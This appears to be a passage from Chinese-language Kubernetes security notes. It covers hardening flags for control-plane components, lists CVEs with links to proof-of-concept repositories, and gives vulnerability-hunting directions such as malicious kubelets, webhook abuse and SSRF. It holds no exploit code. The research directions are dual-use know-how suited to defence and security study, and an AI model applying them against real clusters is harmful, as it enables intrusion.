- `--token-auth-file`，启用静态Token认证，设置时指定cvs文件，格式为`token,username,uid`
- `--authorization-mode`, 设置鉴权模式，若为`AlwaysAllow`则忽略鉴权，若包含`Node`则允许节点的kubelet读取secrets、configmap等信息，[参考](https://kubernetes.io/zh-cn/docs/reference/access-authn-authz/node/)
- `--enable-admission-plugins`，设置准入控制器，不能包含`AlwaysAdmit`，[参考](https://moelove.info/2021/11/30/%E7%90%86%E6%B8%85-Kubernetes-%E4%B8%AD%E7%9A%84%E5%87%86%E5%85%A5%E6%8E%A7%E5%88%B6Admission-Controller/)
- `--enable-admission-plugins`包含`PodSecurityPolicy`，启用pod安全策略插件
- `--enable-admission-plugins`包含`NodeRestriction`，限制kubelet只能操作自身节点的资源
- `--disable-admission-plugins`显式禁用`ServiceAccount`，`ServiceAccount`是默认加载的准入控制器，在创建pod时它会自动往pod中注入secret volume，[参考](https://pradeeploganathan.com/kubernetes/introduction-to-kubernetes-admission-controllers/)
- `--insecure-port`，设置非安全端口为0，否则会造成未授权访问
- `--profiling`，设置为`false`，禁止输出性能调试信息
- `--audit-log-xxx`，设置审计日志相关参数，记录审计信息
- `--audit-policy-file`，设置审计策略，[参考](https://docs.datadoghq.com/integrations/kubernetes_audit_logs/#configuration)
- `--service-account-lookup`，设置为`true`，在校验凭证前首先确认该`service account`是否有效，防止被删除的`service account`的凭证通过认证
- `--service-account-key-file`，设置`service account`签名证书的公钥，若不设置，默认使用`kube-apiserver`的TLS证书

#### 漏洞

- [CVE-2018-1002105 kube-apiserver do not properly close kubelet proxy connection](https://github.com/noirfate/k8s_debug/tree/main/CVE-2018-1002105)
- [CVE-2019-9512: HTTP/2 DOS](https://github.com/Metarget/cloud-native-security-book/tree/main/code/0404-K8s%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB)
- [CVE-2019-11250 kube-apiserver token revealed in log](https://github.com/noirfate/k8s_debug/tree/main/CVE-2019-11250)
- [CVE-2019-11253 kube-apiserver yaml parser dos](https://github.com/noirfate/k8s_debug/tree/main/CVE-2019-11253)
- [CVE-2020-8559 kube-apiserver follow kubelet redirect request](https://github.com/noirfate/k8s_debug/tree/main/CVE-2020-8559)
- [CVE-2020-8561: k8s apiserver SSRF](https://hackerone.com/reports/941178)

#### 挖掘思路
`kube-apiserver`为K8S核心服务，负责认证、鉴权、配置等功能，所有其他组件都通过该前端进行交互，已发现的两个严重漏洞都与`kubelet`有关，在有节点控制权的情况下实现控制整个集群；两个拒绝服务漏洞都与依赖库有关，一个是go的http2实现，一个是yaml解析；日志泄露凭证的问题，实际是越权问题，即在只有查看日志的权限或者再加上设置日志级别的权限时，可以控制整个集群；SSRF漏洞实际上和webhook有关，K8S允许配置各种扩展控制器，通过http协议进行交互。大体思路如下：

- 恶意`kubelet`
- 日志泄露敏感信息
- 越权问题，即通过创建对象等方法实现权限作用域的变化
- 供应链漏洞
- 恶意`webhook`控制器
- SSRF漏洞

### kube-controller-manager
Kubernetes控制器管理器是一个守护进程，内嵌随Kubernetes一起发布的核心控制回路。在Kubernetes中，每个控制器是一个控制回路，通过API服务器监视集群的共享状态，并尝试进行更改以将当前状态转为期望状态。目前，Kubernetes自带的控制器例子包括副本控制器、节点控制器、命名空间控制器和服务账号控制器等

#### 命令行/配置

- `--profiling`，设置为`false`，禁止输出性能调试信息
- `--bind-address`，设置为`127.0.0.1`防止外部请求，`controller-manager`默认监听10252端口，无认证，提供health和metrics信息访问
- `--use-service-account-credentials`，设置为`true`，为每个控制器分配独立的`service account token`，否则所有控制器将使用`controller-manager`自身的凭证
- `--service-account-private-key-file`，指定独立的`service account`凭证加解密证书私钥
- `--feature-gates=RotateKubeletServerCertificate=true`，由于kubelet的证书是由`controller-manager`签发，设置该参数启用kubelet证书到期轮转功能

#### 漏洞

- [CVE-2020-8555 kube-controller-manager SSRF](https://github.com/noirfate/k8s_debug/tree/main/CVE-2020-8555)

#### 挖掘思路
该组件已知漏洞较少，主要为SSRF漏洞，大体思路如下：

- SSRF漏洞

### kube-scheduler
Kubernetes调度器是一个控制面进程，负责将Pods指派到节点上。调度器基于约束和可用资源为调度队列中每个Pod确定其可合法放置的节点。调度器之后对所有合法的节点进行排序，将Pod绑定到一个合适的节点

#### 命令行/配置

- `--profiling`，设置为`false`，禁止输出性能调试信息
- `--bind-address`，设置为`127.0.0.1`防止外部请求，`kube-scheduler`默认监听10251端口，无认证，提供health和metrics信息访问

#### 漏洞

#### 挖掘思路

### kube-proxy
`kube-proxy`是一个网络代理服务，运行在每一个K8S节点上，负责维护`pod`间通信、`node`间通信以及和外部的通信等等的网络规则

#### 命令行/配置

#### 漏洞

- [CVE-2020-8558: route_localnet漏洞](https://github.com/tabbysable/POC-2020-8558)

#### 挖掘思路
该组件已知漏洞较少，主要为网络配置上的安全问题，大体思路如下：

- 不安全的网络配置

## 插件安全

### ingress-nginx

#### 命令行/配置

#### 漏洞

- [CVE-2021-25742 snippet command execution](https://github.com/noirfate/k8s_debug/tree/main/CVE-2021-25742)
- [CVE-2021-25745,CVE-2021-25746,CVE-2021-25748](https://blog.lightspin.io/kubernetes-nginx-ingress-controller-vulnerabilities)

#### 挖掘思路
已知漏洞都是通过对ingress的配置影响nginx配置，导致代码执行、敏感信息泄露等漏洞

## 供应链安全

### SBOM to Vulns
> https://security.googleblog.com/2022/06/sbom-in-action-finding-vulnerabilities.html
